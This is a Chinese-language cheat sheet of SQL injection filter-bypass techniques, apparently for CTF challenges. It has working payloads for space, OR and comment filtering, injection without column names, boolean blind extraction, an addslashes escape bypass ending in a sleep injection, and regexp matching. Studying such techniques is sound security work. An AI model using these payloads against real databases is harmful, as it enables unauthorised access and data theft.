## **编码绕过**
is_numeric($_GET[‘id’]) ，过滤只允许数字，16进制编码sql注入。

^
## **空格被过滤**
+空格过滤可以利用/**/代替空格。
利用括号，括号住变量。
```
所有库
select(group_concat(schema_name))from(information_schema.schemata)
库所有表
select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())
```

^
## **注释符被过滤**
将后面的单引号闭合即可。

^
## **or 被过滤导致orderby、information_schema都不能用**
用其他逻辑运算符and ， && ， &， |  ,1^1^
查表名使用 
```
select group_concat(table_name）from mysql.innodb_table_stats where database_name=database()
```
如果information_schema被禁止，通过sys.schema获取当前数据库表名
```
1&&ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))=103
2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{},1))={}.format()
```

^
## **无字段名注入**
<https://www.cnblogs.com/hello-there/p/12918265.html>
知道表名
```
表的字段数判断：select 1,2 union select * from user  试出字段数。

再直接查出值，无需知道字段名，查出原表第2的字段的所有记录值
select 1,2 union select * from user;

select `2` from  (select 1,2 union select * from user) as u

整合
select group_concat(`2`) from  (select 1,2 union select * from user) as u 


1. 列名需要用`\`包裹起来，字段名为数字，则`2`

2. 使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)
```

## **布尔中知道表名，不知字段名注入，布尔加无列名注入**
```
表中如果有多个记录值：要条件查询成一条，一般都是一条。where flag like "f%"

表的字段数判断：select 1,2 union select * from user  试出字段数。

一个字段一条记录
select((select "{}")>(select * from f1ag_1s_h3r3_hhhhh))
两个字段一条记录，获取字段
select((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))

select((select 1,"fla")>(select * from f1ag_1s_h3r3_hhhhh))
通过flb>flag{xxx} 比较结果1或0即可
当为1时的回显，值-1就是正确字符
2||((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))
```

^
## **函数等效替换**
报错函数被过滤，寻找顶替。



^
## **存在转义函数addslashes绕过**
```
addslashes($id);
将字符串里面的' " \等转义。
'将变成\'


如果此时下面存在，特殊字符去除 \0 %00 \' '
$id=str_replace(array("\\0","%00","\\'","'"),"",$id);

那么传入\0 先变成\\0 再变成\
如果是sql语句\就会转义后面字符。
select * from images where id='{$id}' or path='{$path}'

select * from images where id='\' or path='   {$path}'
这里'\' or path = ' 成了一个单独字符串
$path就可以随意注入
or sleep(3)--+
```


^
## **where后= like被过滤，用字段名使用正则模糊匹配字段的值**
需要知道字段名
```
select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')

select flag from Flag where flag regexp "^f";

flag like "f%"
```